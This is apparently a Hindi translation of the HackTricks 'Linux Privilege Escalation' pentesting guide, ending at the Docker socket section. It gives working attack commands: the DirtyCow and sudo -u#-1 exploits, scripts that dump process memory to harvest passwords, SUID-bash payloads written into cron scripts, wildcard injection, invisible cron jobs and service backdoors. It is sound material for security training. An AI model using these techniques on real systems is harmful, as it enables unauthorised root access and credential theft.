# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

आइए चलो चल रहे OS के बारे में कुछ ज्ञान प्राप्त करते हैं
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास `PATH` वेरिएबल के अंदर किसी भी फ़ोल्डर पर लिखने की अनुमति है, तो आप कुछ लाइब्रेरी या बाइनरी को हाइजैक करने में सक्षम हो सकते हैं:
```bash
echo $PATH
```
### Env info

दिलचस्प जानकारी, पासवर्ड या API कुंजी क्या पर्यावरण चर में हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

कर्नेल संस्करण की जांच करें और यदि कोई ऐसा एक्सप्लॉइट है जिसका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छा कमजोर कर्नेल सूची और कुछ पहले से **संकलित एक्सप्लॉइट्स** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।\
अन्य साइटें जहाँ आप कुछ **संकलित एक्सप्लॉइट्स** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी कमजोर कर्नेल संस्करणों को निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
कर्नेल एक्सप्लॉइट्स की खोज करने में मदद करने वाले उपकरण हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (शिकार पर निष्पादित करें, केवल कर्नेल 2.x के लिए एक्सप्लॉइट्स की जांच करता है)

हमेशा **Google में कर्नेल संस्करण खोजें**, शायद आपका कर्नेल संस्करण किसी कर्नेल एक्सप्लॉइट में लिखा हो और फिर आप सुनिश्चित होंगे कि यह एक्सप्लॉइट मान्य है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

जो कमजोर sudo संस्करणों पर आधारित है जो प्रकट होते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण कमजोर है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

**smasher2 box of HTB** के लिए एक **उदाहरण** देखें कि इस vuln का कैसे शोषण किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक सिस्टम एन्यूमरेशन
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा की गणना करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### ग्रसिक्योरिटी
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप एक docker कंटेनर के अंदर हैं, तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## Drives

जांचें **क्या माउंट किया गया है और क्या अनमाउंट किया गया है**, कहाँ और क्यों। यदि कुछ अनमाउंट किया गया है, तो आप इसे माउंट करने और निजी जानकारी की जांच करने की कोशिश कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी बाइनरीज़ की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, **कोई भी कंपाइलर स्थापित है या नहीं** यह जांचें। यह उपयोगी है यदि आपको कुछ कर्नेल एक्सप्लॉइट का उपयोग करने की आवश्यकता है क्योंकि इसे उस मशीन पर संकलित करना अनुशंसित है जहाँ आप इसका उपयोग करने जा रहे हैं (या एक समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

**स्थापित पैकेज और सेवाओं के संस्करण** की जांच करें। शायद कुछ पुराना Nagios संस्करण (उदाहरण के लिए) है जिसे विशेषाधिकार बढ़ाने के लिए शोषण किया जा सकता है…\
यह अनुशंसा की जाती है कि अधिक संदिग्ध स्थापित सॉफ़्टवेयर के संस्करण की मैन्युअल रूप से जांच करें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन पर SSH पहुंच है, तो आप **openVAS** का उपयोग करके मशीन के अंदर स्थापित पुराने और कमजोर सॉफ़्टवेयर की जांच कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएंगे जो ज्यादातर बेकार होगी, इसलिए कुछ एप्लिकेशन जैसे OpenVAS या समान का उपयोग करने की सिफारिश की जाती है जो जांचेंगे कि क्या कोई स्थापित सॉफ़्टवेयर संस्करण ज्ञात शोषणों के लिए कमजोर है_

## Processes

देखें कि **कौन से प्रक्रियाएँ** निष्पादित की जा रही हैं और जांचें कि क्या कोई प्रक्रिया **उससे अधिक विशेषाधिकार रखती है जितनी उसे होनी चाहिए** (शायद एक tomcat जिसे root द्वारा निष्पादित किया जा रहा है?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers**] के लिए जांचें जो चल रहे हैं, आप इसका दुरुपयोग करके विशेषाधिकार बढ़ा सकते हैं](electron-cef-chromium-debugger-abuse.md)। **Linpeas** इनकी पहचान करने के लिए प्रक्रिया की कमांड लाइन में `--inspect` पैरामीटर की जांच करता है।\
साथ ही **प्रक्रियाओं के बाइनरी पर अपने विशेषाधिकारों की जांच करें**, शायद आप किसी को ओवरराइट कर सकते हैं।

### प्रक्रिया निगरानी

आप प्रक्रियाओं की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे उपकरणों का उपयोग कर सकते हैं। यह अक्सर चल रही कमजोर प्रक्रियाओं की पहचान करने के लिए बहुत उपयोगी हो सकता है या जब आवश्यकताओं का एक सेट पूरा होता है।

### प्रक्रिया मेमोरी

एक सर्वर की कुछ सेवाएँ **मेमोरी के अंदर स्पष्ट पाठ में क्रेडेंशियल्स** सहेजती हैं।\
सामान्यतः, आपको अन्य उपयोगकर्ताओं से संबंधित प्रक्रियाओं की मेमोरी पढ़ने के लिए **रूट विशेषाधिकार** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से ही रूट हैं और अधिक क्रेडेंशियल्स खोजने की कोशिश कर रहे हैं।\
हालांकि, याद रखें कि **एक नियमित उपयोगकर्ता के रूप में आप उन प्रक्रियाओं की मेमोरी पढ़ सकते हैं जिनके आप मालिक हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश मशीनें **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं** जिसका अर्थ है कि आप अपने विशेषाधिकारहीन उपयोगकर्ता से संबंधित अन्य प्रक्रियाओं को डंप नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुंच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रक्रियाओं को डिबग किया जा सकता है, जब तक कि उनके पास समान uid हो। यह ptracing के काम करने का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल एक माता-पिता प्रक्रिया को डिबग किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल व्यवस्थापक ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE क्षमता की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: कोई प्रक्रियाएँ ptrace के साथ ट्रेस नहीं की जा सकतीं। एक बार सेट होने पर, ptracing को फिर से सक्षम करने के लिए एक रिबूट की आवश्यकता होती है।

#### GDB

यदि आपके पास एक FTP सेवा (उदाहरण के लिए) की मेमोरी तक पहुंच है, तो आप Heap प्राप्त कर सकते हैं और इसके क्रेडेंशियल्स के अंदर खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए प्रक्रिया आईडी के लिए, **maps दिखाता है कि मेमोरी उस प्रक्रिया के** वर्चुअल एड्रेस स्पेस के भीतर कैसे मैप की गई है; यह **प्रत्येक मैप की गई क्षेत्र के अनुमतियों** को भी दिखाता है। **mem** प्सेउडो फ़ाइल **प्रक्रियाओं की मेमोरी को स्वयं उजागर करती है**। **maps** फ़ाइल से हम जानते हैं कि **कौन सी मेमोरी क्षेत्र पढ़ने योग्य हैं** और उनके ऑफसेट। हम इस जानकारी का उपयोग **mem फ़ाइल में खोजने और सभी पढ़ने योग्य क्षेत्रों को एक फ़ाइल में डंप करने** के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि आभासी मेमोरी तक। कर्नेल की आभासी पता स्थान को /dev/kmem का उपयोग करके एक्सेस किया जा सकता है।\
आम तौर पर, `/dev/mem` केवल **रूट** और **kmem** समूह द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump एक Linux में Sysinternals टूल्स के सूट से क्लासिक ProcDump टूल का पुनः आविष्कार है जो Windows के लिए है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) पर प्राप्त करें।
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

एक प्रक्रिया की मेमोरी को डंप करने के लिए आप उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से रूट आवश्यकताओं को हटा सकते हैं और आपके द्वारा स्वामित्व वाली प्रक्रिया को डंप कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (रूट की आवश्यकता है)

### Credentials from Process Memory

#### Manual example

यदि आप पाते हैं कि प्रमाणीकरण प्रक्रिया चल रही है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप प्रक्रिया को डंप कर सकते हैं (विभिन्न तरीकों को खोजने के लिए पिछले अनुभागों को देखें जो एक प्रक्रिया की मेमोरी को डंप करने के लिए हैं) और मेमोरी के अंदर क्रेडेंशियल्स के लिए खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह उपकरण [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी से स्पष्ट पाठ क्रेडेंशियल्स** और कुछ **अच्छी तरह से ज्ञात फ़ाइलों** से **चोरी** करेगा। इसे सही तरीके से काम करने के लिए रूट विशेषाधिकार की आवश्यकता होती है।

| विशेषता                                           | प्रक्रिया का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali डेस्कटॉप, Debian डेस्कटॉप)       | gdm-password         |
| Gnome कीरिंग (Ubuntu डेस्कटॉप, ArchLinux डेस्कटॉप) | gnome-keyring-daemon |
| LightDM (Ubuntu डेस्कटॉप)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                   | vsftpd               |
| Apache2 (सक्रिय HTTP बेसिक ऑथ सत्र)         | apache2              |
| OpenSSH (सक्रिय SSH सत्र - Sudo उपयोग)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

जांचें कि क्या कोई निर्धारित कार्य कमजोर है। शायद आप एक स्क्रिप्ट का लाभ उठा सकते हैं जो रूट द्वारा निष्पादित हो रही है (वाइल्डकार्ड कमजोर? क्या रूट द्वारा उपयोग की जाने वाली फ़ाइलों को संशोधित कर सकते हैं? क्या सिम्लिंक्स का उपयोग कर सकते हैं? क्या रूट द्वारा उपयोग की जाने वाली निर्देशिका में विशिष्ट फ़ाइलें बना सकते हैं?)।
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने के अधिकार हैं_)

यदि इस क्रॉनटैब के अंदर रूट उपयोगकर्ता बिना पथ सेट किए कुछ कमांड या स्क्रिप्ट निष्पादित करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके एक रूट शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि एक स्क्रिप्ट जिसे रूट द्वारा निष्पादित किया गया है, एक कमांड के अंदर “**\***” है, तो आप इसका उपयोग अप्रत्याशित चीजें (जैसे privesc) करने के लिए कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि वाइल्डकार्ड के पहले एक पथ है जैसे** _**/some/path/\***_ **, तो यह संवेदनशील नहीं है (यहां तक कि** _**./\***_ **भी नहीं है)।**

अधिक वाइल्डकार्ड शोषण चालों के लिए निम्नलिखित पृष्ठ पढ़ें:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### क्रोन स्क्रिप्ट ओवरराइटिंग और सिम्लिंक

यदि आप **एक क्रोन स्क्रिप्ट को संशोधित कर सकते हैं** जिसे रूट द्वारा निष्पादित किया जाता है, तो आप बहुत आसानी से एक शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि रूट द्वारा निष्पादित स्क्रिप्ट एक **निर्देशिका का उपयोग करती है जहाँ आपके पास पूर्ण पहुंच है**, तो शायद उस फ़ोल्डर को हटाना और **आपके द्वारा नियंत्रित स्क्रिप्ट की सेवा करने वाले दूसरे फ़ोल्डर के लिए एक सिम्लिंक फ़ोल्डर बनाना** उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

आप प्रक्रियाओं की निगरानी कर सकते हैं ताकि उन प्रक्रियाओं की खोज की जा सके जो हर 1, 2 या 5 मिनट में चल रही हैं। शायद आप इसका लाभ उठा सकते हैं और विशेषाधिकार बढ़ा सकते हैं।

उदाहरण के लिए, **1 मिनट के लिए हर 0.1 सेकंड की निगरानी करने के लिए**, **कम चलाए गए कमांड के अनुसार क्रमबद्ध करें** और उन कमांड को हटा दें जो सबसे अधिक चलाए गए हैं, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर प्रक्रिया की निगरानी करेगा और सूचीबद्ध करेगा जो शुरू होती है)।

### अदृश्य क्रोन जॉब्स

एक क्रोनजॉब बनाना संभव है **एक टिप्पणी के बाद कैरिज रिटर्न डालकर** (बिना न्यूलाइन कैरेक्टर के), और क्रोन जॉब काम करेगा। उदाहरण (कैरिज रिटर्न कैरेक्टर पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

जांचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, यदि आप कर सकते हैं, तो आप इसे **संशोधित कर सकते हैं** ताकि यह **आपका बैकडोर चलाए** जब सेवा **शुरू**, **पुनः शुरू** या **रोक दी** जाती है (शायद आपको मशीन के पुनरारंभ होने का इंतजार करना पड़े)।\
उदाहरण के लिए, .service फ़ाइल के अंदर अपने बैकडोर को **`ExecStart=/tmp/script.sh`** के साथ बनाएं।

### Writable service binaries

ध्यान रखें कि यदि आपके पास **सेवाओं द्वारा निष्पादित बाइनरी पर लिखने की अनुमति है**, तो आप उन्हें बैकडोर के लिए बदल सकते हैं ताकि जब सेवाएं फिर से निष्पादित हों, तो बैकडोर चलाए जाएं।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फ़ोल्डर में **लिख** सकते हैं, तो आप **अधिकार बढ़ाने** में सक्षम हो सकते हैं। आपको सेवा कॉन्फ़िगरेशन फ़ाइलों में **सापेक्ष पथों** के लिए खोजने की आवश्यकता है जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, एक **executables** बनाएं जिसका **नाम उस सापेक्ष पथ बाइनरी** के समान हो जो आप लिख सकते हैं, और जब सेवा को कमजोर क्रिया (**Start**, **Stop**, **Reload**) को निष्पादित करने के लिए कहा जाता है, तो आपका **backdoor निष्पादित होगा** (अधिकारहीन उपयोगकर्ता आमतौर पर सेवाओं को शुरू/रोक नहीं सकते हैं लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**सेवाओं के बारे में अधिक जानें `man systemd.service` के साथ।**

## **Timers**

**Timers** systemd यूनिट फ़ाइलें हैं जिनका नाम `**.timer**` में समाप्त होता है जो `**.service**` फ़ाइलों या घटनाओं को नियंत्रित करता है। **Timers** को क्रॉन के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें कैलेंडर समय घटनाओं और मोनोटोनिक समय घटनाओं के लिए अंतर्निहित समर्थन होता है और इन्हें असिंक्रोनस रूप से चलाया जा सकता है।

आप सभी टाइमर्स को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### Writable timers

यदि आप एक टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit के कुछ उदाहरणों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि यूनिट क्या है:

> जब यह टाइमर समाप्त होता है, तो सक्रिय करने के लिए यूनिट। तर्क एक यूनिट नाम है, जिसका उपसर्ग ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस सेवा पर डिफ़ॉल्ट होता है जिसका नाम टाइमर यूनिट के समान होता है, सिवाय उपसर्ग के। (ऊपर देखें।) यह अनुशंसा की जाती है कि सक्रिय की जाने वाली यूनिट का नाम और टाइमर यूनिट का नाम समान रूप से नामित किया जाए, सिवाय उपसर्ग के।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको चाहिए:

- कुछ systemd यूनिट (जैसे `.service`) खोजें जो **एक लिखने योग्य बाइनरी** को **निष्पादित** कर रहा है
- कुछ systemd यूनिट खोजें जो **एक सापेक्ष पथ** को **निष्पादित** कर रहा है और आपके पास **systemd PATH** पर **लिखने की अनुमति** है (उस निष्पादन योग्य की नकल करने के लिए)

**`man systemd.timer` के साथ टाइमर्स के बारे में अधिक जानें।**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको रूट अनुमतियों की आवश्यकता है और निष्पादित करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) **प्रक्रिया संचार** को समान या विभिन्न मशीनों पर क्लाइंट-सेर्वर मॉडल के भीतर सक्षम करते हैं। वे इंटर-कंप्यूटर संचार के लिए मानक Unix डिस्क्रिप्टर फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेट किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` के साथ सॉकेट के बारे में अधिक जानें।** इस फ़ाइल के अंदर, कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं लेकिन एक सारांश का उपयोग **यह इंगित करने के लिए किया जाता है कि यह सॉकेट पर कहां सुनने जा रहा है** (AF_UNIX सॉकेट फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)
- `Accept`: एक बूलियन तर्क लेता है। यदि **सत्य**, तो **प्रत्येक आने वाले कनेक्शन के लिए एक सेवा उदाहरण उत्पन्न होता है** और केवल कनेक्शन सॉकेट इसे पास किया जाता है। यदि **झूठ**, तो सभी सुनने वाले सॉकेट स्वयं **शुरू की गई सेवा इकाई** को पास किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक सेवा इकाई उत्पन्न होती है। यह मान डाटाग्राम सॉकेट और FIFOs के लिए अनदेखा किया जाता है जहां एकल सेवा इकाई बिना शर्त सभी आने वाले ट्रैफ़िक को संभालती है। **डिफ़ॉल्ट रूप से झूठा है**। प्रदर्शन कारणों से, नए डेमनों को केवल `Accept=no` के लिए उपयुक्त तरीके से लिखने की सिफारिश की जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या एक से अधिक कमांड लाइनों को लेता है, जो **सुनने वाले** **सॉकेट**/FIFOs के **निर्माण** और बंधन से पहले या बाद में **निष्पादित** होते हैं। कमांड लाइन का पहला टोकन एक पूर्ण फ़ाइल नाम होना चाहिए, उसके बाद प्रक्रिया के लिए तर्क होते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **कमांड** जो **सुनने वाले** **सॉकेट**/FIFOs के **बंद** और हटाए जाने से पहले या बाद में **निष्पादित** होते हैं।
- `Service`: **आने वाले ट्रैफ़िक** पर **सक्रिय करने** के लिए **सेवा** इकाई का नाम निर्दिष्ट करता है। यह सेटिंग केवल उन सॉकेट्स के लिए अनुमति है जिनका Accept=no है। यह उस सेवा पर डिफ़ॉल्ट होता है जिसका नाम सॉकेट के समान होता है (स suffixed को प्रतिस्थापित किया जाता है)। अधिकांश मामलों में, इस विकल्प का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप एक **लिखने योग्य** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` अनुभाग के शुरू में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और बैकडोर सॉकेट के निर्माण से पहले निष्पादित होगा। इसलिए, आपको **संभवतः मशीन के पुनरारंभ होने की प्रतीक्षा करनी होगी।**\
_ध्यान दें कि सिस्टम को उस सॉकेट फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए या बैकडोर निष्पादित नहीं होगा_

### Writable sockets

यदि आप **कोई लिखने योग्य सॉकेट पहचानते हैं** (_अब हम Unix Sockets के बारे में बात कर रहे हैं और कॉन्फ़िगरेशन `.socket` फ़ाइलों के बारे में नहीं_), तो **आप उस सॉकेट के साथ संवाद कर सकते हैं** और शायद एक भेद्यता का शोषण कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**शोषण उदाहरण:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP सॉकेट

ध्यान दें कि कुछ **सॉकेट HTTP** अनुरोधों के लिए सुन रहे हो सकते हैं (_मैं .socket फ़ाइलों की बात नहीं कर रहा हूँ बल्कि उन फ़ाइलों की बात कर रहा हूँ जो यूनिक्स सॉकेट के रूप में कार्य करती हैं_)। आप इसे इस तरह जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि सॉकेट **HTTP** अनुरोध के साथ **प्रतिक्रिया** करता है, तो आप इसके साथ **संवाद** कर सकते हैं और शायद **कुछ कमजोरियों का लाभ उठा सकते हैं**।

### Writable Docker Socket

